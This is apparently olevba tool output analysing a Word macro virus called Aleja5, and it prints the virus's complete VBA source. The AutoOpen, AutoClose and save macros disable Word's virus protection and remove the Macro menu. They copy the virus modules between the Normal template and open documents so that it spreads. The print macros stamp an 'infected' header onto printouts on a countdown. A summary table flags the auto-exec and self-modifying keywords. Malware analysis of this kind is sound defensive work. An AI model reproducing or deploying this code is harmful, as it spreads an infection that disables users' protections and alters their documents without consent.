olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Aleja
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument 
in file: Virus.MSWord.Aleja - OLE stream: 'ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose 
in file: Virus.MSWord.Aleja - OLE stream: 'AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()

On Error Resume Next


Options.VirusProtection = False
CommandBars("Tools").Controls("Macro").Delete


Dim modulo(6) As String
Dim n As Integer

Version = GetSetting(appname:="Aleja5", Section:="Inicio", _
                       Key:="Version", Default:="2")

If Version <= 2 Then

SaveSetting appname:="Aleja5", Section:="Inicio", _
                Key:="Version", setting:=2



n = 6
modulo(1) = "AutoClose"
modulo(2) = "AutoOpen"
modulo(3) = "ArchivoGuardar"
modulo(4) = "ArchivoGuardarComo"
modulo(5) = "ArchivoImprimir"
modulo(6) = "ArchivoImprimirPredeter"



For m = 1 To n

existe = False

For Each VBComponent In NormalTemplate.VBProject.VBComponents
    
    If VBComponent.Name = modulo(m) Then
            existe = True
    End If
Next VBComponent

If Not existe Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
            Destination:=NormalTemplate.FullName, Name:=modulo(m), _
            Object:=wdOrganizerObjectProjectItems
End If

existe = False

For Each VBComponent In ActiveDocument.VBProject.VBComponents
    
    If VBComponent.Name = modulo(m) Then
            existe = True
    End If
Next VBComponent

If Not existe Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
            Destination:=ActiveDocument.FullName, Name:=modulo(m), _
            Object:=wdOrganizerObjectProjectItems
End If

Next

End If

End Sub

-------------------------------------------------------------------------------
VBA MACRO AutoOpen 
in file: Virus.MSWord.Aleja - OLE stream: 'AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()

On Error Resume Next



Options.VirusProtection = False
CommandBars("Tools").Controls("Macro").Delete

Dim modulo(6) As String
Dim n As Integer

Version = GetSetting(appname:="Aleja5", Section:="Inicio", _
                       Key:="Version", Default:="2")

If Version <= 2 Then

SaveSetting appname:="Aleja5", Section:="Inicio", _
                Key:="Version", setting:=2



n = 6
modulo(1) = "AutoClose"
modulo(2) = "AutoOpen"
modulo(3) = "ArchivoGuardar"
modulo(4) = "ArchivoGuardarComo"
modulo(5) = "ArchivoImprimir"
modulo(6) = "ArchivoImprimirPredeter"


For m = 1 To n

existe = False

For Each VBComponent In NormalTemplate.VBProject.VBComponents
    
    If VBComponent.Name = modulo(m) Then
            existe = True
    End If
Next VBComponent

If Not existe Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
            Destination:=NormalTemplate.FullName, Name:=modulo(m), _
            Object:=wdOrganizerObjectProjectItems
End If

existe = False

For Each VBComponent In ActiveDocument.VBProject.VBComponents
    
    If VBComponent.Name = modulo(m) Then
            existe = True
    End If
Next VBComponent

If Not existe Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
            Destination:=ActiveDocument.FullName, Name:=modulo(m), _
            Object:=wdOrganizerObjectProjectItems
End If

Next



Documents.Save NoPrompt:=True, OriginalFormat:=wdWordDocument

End If


End Sub

-------------------------------------------------------------------------------
VBA MACRO ArchivoGuardar 
in file: Virus.MSWord.Aleja - OLE stream: 'ArchivoGuardar'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub MAIN()

On Error Resume Next

Options.VirusProtection = False
CommandBars("Tools").Controls("Macro").Delete

Dim modulo(6) As String
Dim n As Integer


Version = GetSetting(appname:="Aleja5", Section:="Inicio", _
                       Key:="Version", Default:="2")

If Version <= 2 Then

SaveSetting appname:="Aleja5", Section:="Inicio", _
                Key:="Version", setting:=2


n = 6
modulo(1) = "AutoClose"
modulo(2) = "AutoOpen"
modulo(3) = "ArchivoGuardar"
modulo(4) = "ArchivoGuardarComo"
modulo(5) = "ArchivoImprimir"
modulo(6) = "ArchivoImprimirPredeter"


For m = 1 To n


existe = False

For Each VBComponent In ActiveDocument.VBProject.VBComponents
    
    If VBComponent.Name = modulo(m) Then
            existe = True
    End If
Next VBComponent

If Not existe Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
            Destination:=ActiveDocument.FullName, Name:=modulo(m), _
            Object:=wdOrganizerObjectProjectItems
End If

Next

Documents.Save NoPrompt:=True, OriginalFormat:=wdWordDocument

Else

End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO ArchivoGuardarComo 
in file: Virus.MSWord.Aleja - OLE stream: 'ArchivoGuardarComo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub MAIN()

On Error Resume Next


Options.VirusProtection = False
CommandBars("Tools").Controls("Macro").Delete



Dim modulo(6) As String
Dim n As Integer

Version = GetSetting(appname:="Aleja5", Section:="Inicio", _
                       Key:="Version", Default:="2")

If Version <= 2 Then

SaveSetting appname:="Aleja5", Section:="Inicio", _
                Key:="Version", setting:=2


n = 6
modulo(1) = "AutoClose"
modulo(2) = "AutoOpen"
modulo(3) = "ArchivoGuardar"
modulo(4) = "ArchivoGuardarComo"
modulo(5) = "ArchivoImprimir"
modulo(6) = "ArchivoImprimirPredeter"




For m = 1 To n

existe = False

For Each VBComponent In ActiveDocument.VBProject.VBComponents
    
    If VBComponent.Name = modulo(m) Then
            existe = True
    End If
Next VBComponent

If Not existe Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
            Destination:=ActiveDocument.FullName, Name:=modulo(m), _
            Object:=wdOrganizerObjectProjectItems
End If

Next


If Dialogs(wdDialogFileSaveAs).Show = -1 Then
    Documents.Save NoPrompt:=True, OriginalFormat:=wdWordDocument
End If


End If

End Sub




-------------------------------------------------------------------------------
VBA MACRO ArchivoImprimir 
in file: Virus.MSWord.Aleja - OLE stream: 'ArchivoImprimir'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()

Valor = GetSetting(appname:="Aleja5", Section:="Inicio", _
                       Key:="Valor", Default:="50")

If Valor = 0 Then

With ActiveDocument.Sections(1)
    .Headers(wdHeaderFooterPrimary).Range.Cut
    .Headers(wdHeaderFooterPrimary).Range.Text = "Documento infectado con el virus ALEJA5"
    .Headers(wdHeaderFooterPrimary).Range.Font.Size = 12
    .Headers(wdHeaderFooterPrimary).Range.Font.Bold = True
End With

Dialogs(wdDialogFilePrint).Show

With ActiveDocument.Sections(1)
    .Headers(wdHeaderFooterPrimary).Range.Paste
End With

Valor = GetSetting(appname:="Aleja5", Section:="Inicio", _
                       Key:="Valor", Default:="50")

SaveSetting appname:="Aleja5", Section:="Inicio", _
            Key:="Valor", setting:=(1)
Else
    Dialogs(wdDialogFilePrint).Show
    SaveSetting appname:="Aleja5", Section:="Inicio", _
                Key:="Valor", setting:=(Valor - 1)
End If

End Sub


-------------------------------------------------------------------------------
VBA MACRO ArchivoImprimirPredeter 
in file: Virus.MSWord.Aleja - OLE stream: 'ArchivoImprimirPredeter'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()

Valor = GetSetting(appname:="Aleja5", Section:="Inicio", _
                       Key:="Valor", Default:="50")

If Valor = 0 Then

With ActiveDocument.Sections(1)
    .Headers(wdHeaderFooterPrimary).Range.Cut
    .Headers(wdHeaderFooterPrimary).Range.Text = "Documento infectado con el virus ALEJA5"
    .Headers(wdHeaderFooterPrimary).Range.Font.Size = 12
    .Headers(wdHeaderFooterPrimary).Range.Font.Bold = True
End With

ActiveDocument.PrintOut

With ActiveDocument.Sections(1)
    .Headers(wdHeaderFooterPrimary).Range.Paste
End With

Valor = GetSetting(appname:="Aleja5", Section:="Inicio", _
                       Key:="Valor", Default:="50")

SaveSetting appname:="Aleja5", Section:="Inicio", _
            Key:="Valor", setting:=(1)
Else
    ActiveDocument.PrintOut
    SaveSetting appname:="Aleja5", Section:="Inicio", _
                Key:="Valor", setting:=(Valor - 1)
End If

End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

